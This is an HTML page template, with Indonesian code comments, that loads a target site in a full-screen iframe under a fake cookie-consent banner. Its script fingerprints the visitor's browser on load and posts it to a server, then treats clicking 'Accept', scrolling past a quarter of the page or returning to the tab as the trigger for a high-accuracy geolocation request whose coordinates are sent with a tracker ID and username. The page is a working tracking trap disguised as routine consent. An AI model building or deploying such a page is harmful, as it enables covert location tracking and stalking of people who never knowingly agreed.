<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{PAGE_TITLE}}</title>
    <style>
        body, html { 
            margin: 0; 
            padding: 0; 
            height: 100%; 
            overflow: auto; /* Memastikan scroll bisa berfungsi */
        }
        .frame-container { 
            position: absolute; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            border: none; 
        }
        #cookie-trap-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            background-color: #f8f9fa;
            color: #212529;
            z-index: 2000;
            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
            font-family: Arial, sans-serif;
            font-size: 14px;
            transform: translateY(100%);
            transition: transform 0.5s ease-in-out;
        }
        #cookie-trap-banner.visible {
            transform: translateY(0);
        }
        .cookie-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 25px;
            flex-wrap: wrap;
            gap: 15px;
        }
        .cookie-text p { margin: 0; line-height: 1.5; }
        .cookie-text a { color: #0d6efd; text-decoration: underline; }
        .cookie-buttons { display: flex; gap: 10px; flex-shrink: 0; }
        .cookie-btn {
            padding: 8px 16px;
            border: 1px solid #6c757d;
            background-color: #ffffff;
            color: #212529;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            transition: all 0.2s ease;
        }
        .cookie-btn:hover { background-color: #e9ecef; }
        .cookie-btn.primary {
            background-color: #0d6efd;
            border-color: #0d6efd;
            color: #ffffff;
        }
         .cookie-btn.primary:hover { background-color: #0b5ed7; }
    </style>
</head>
<body>
    <iframe class="frame-container" src="{{DESTINATION_URL}}"></iframe>

    <div id="cookie-trap-banner">
        <div class="cookie-content">
            <div class="cookie-text">
                <p>We use cookies to enhance your browsing experience and analyze our traffic. <a href="#">Learn more</a>.</p>
            </div>
            <div class="cookie-buttons">
                <button id="decline-btn" class="cookie-btn">Decline</button>
                <button id="accept-btn" class="cookie-btn primary">Accept</button>
            </div>
        </div>
    </div>
    
    <script>
        const trackerId = "{{TRACKER_ID}}";
        const username = "{{USERNAME}}";
        let hasTriggered = false;

        // --- Fungsi Inti ---

        const sendData = async (endpoint, payload) => {
            try {
                await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload),
                });
            } catch (error) {
                console.error(`Failed to send data to ${endpoint}:`, error);
            }
        };
        
        const generateFingerprint = async () => {
            // Mengumpulkan data dasar
            const details = {
                userAgent: navigator.userAgent,
                screenResolution: `${screen.width}x${screen.height}x${screen.colorDepth}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                platform: navigator.platform,
                plugins: Array.from(navigator.plugins).map(p => p.name)
            };

            // Canvas Fingerprinting
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const txt = 'Browser-Fingerprint-String-12345!@#$%';
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.textBaseline = "alphabetic";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125,1,62,20);
                ctx.fillStyle = "#069";
                ctx.fillText(txt, 2, 15);
                details.canvasData = canvas.toDataURL();
            } catch (e) {
                details.canvasData = "unsupported";
            }

            // Generate Hash dari detail
            const detailString = JSON.stringify(details);
            const hashBuffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(detailString));
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            const fingerprintHash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
            
            return { fingerprintHash, details };
        };

        const triggerActionAndCleanup = (triggerType) => {
            if (hasTriggered) return;
            hasTriggered = true;
            console.log(`Action triggered by: ${triggerType}`);
            
            // Mengirim data lokasi
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        console.log("Location captured!");
                        sendData('/log', {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            trackerId,
                            username
                        });
                    },
                    (error) => { console.warn('Geolocation error:', error.message); },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            }
            cleanup();
        };

        const cleanup = () => {
            const banner = document.getElementById('cookie-trap-banner');
            if (banner) banner.classList.remove('visible');
            
            document.removeEventListener('scroll', handleScroll);
            document.removeEventListener('visibilitychange', handleVisibilityChange);
            console.log("All behavioral listeners removed.");
        };

        // --- Logika Pemicu ---

        const handleScroll = () => {
            const scrollPercentage = (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100;
            if (scrollPercentage > 25) {
                triggerActionAndCleanup('scroll');
            }
        };

        let hasBeenHidden = false;
        const handleVisibilityChange = () => {
            if (document.hidden) {
                hasBeenHidden = true;
            } else if (hasBeenHidden) {
                triggerActionAndCleanup('tab-refocus');
            }
        };

        // --- Inisialisasi Jebakan ---
        (async () => {
            // 1. Langsung ambil dan kirim fingerprint saat halaman dimuat
            const { fingerprintHash, details } = await generateFingerprint();
            sendData('/api/fingerprint', { trackerId, fingerprintHash, details });
            console.log(`Fingerprint sent: ${fingerprintHash}`);

            // 2. Pasang listener untuk tombol-tombol banner
            document.getElementById('accept-btn').addEventListener('click', () => triggerActionAndCleanup('cookie_accept'));
            document.getElementById('decline-btn').addEventListener('click', () => {
                if (hasTriggered) return;
                hasTriggered = true;
                console.log("Action: Decline. Cleaning up.");
                cleanup();
            });

            // 3. Pasang "ranjau" perilaku pasif
            document.addEventListener('scroll', handleScroll, { passive: true });
            document.addEventListener('visibilitychange', handleVisibilityChange);

            // 4. Tampilkan banner setelah jeda singkat
            setTimeout(() => {
                if (!hasTriggered) {
                    const banner = document.getElementById('cookie-trap-banner');
                    if(banner) banner.classList.add('visible');
                }
            }, 1500);
        })();

    </script>
</body>
</html>